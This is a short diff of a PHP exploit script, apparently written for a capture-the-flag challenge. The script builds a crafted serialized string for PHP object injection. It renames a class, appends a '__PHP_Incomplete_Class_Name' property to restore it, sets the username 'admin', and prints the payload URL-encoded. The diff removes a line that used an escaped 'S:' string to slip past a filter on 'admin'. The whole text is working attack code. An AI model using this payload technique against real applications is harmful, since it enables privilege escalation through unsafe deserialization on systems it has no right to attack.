@@ -43,11 +43,9 @@ $token = new Access();
 $user->username = 'admin';
 $ser = serialize($token);
 $ser = str_replace('Access":2', 'LilRan":3', $ser);
-
 $ser = substr($ser, 0, -1);
 $ser .= 's:27:"__PHP_Incomplete_Class_Name";s:6:"Access";}';
 $user->value = $ser;
 $userser = serialize($user);
-$userser = str_replace(';s:5:"admin"', ';S:5:"\61dmin"', $userser);
 $fin = substr($userser, 0, -1);
 echo urlencode($fin) . "\n";
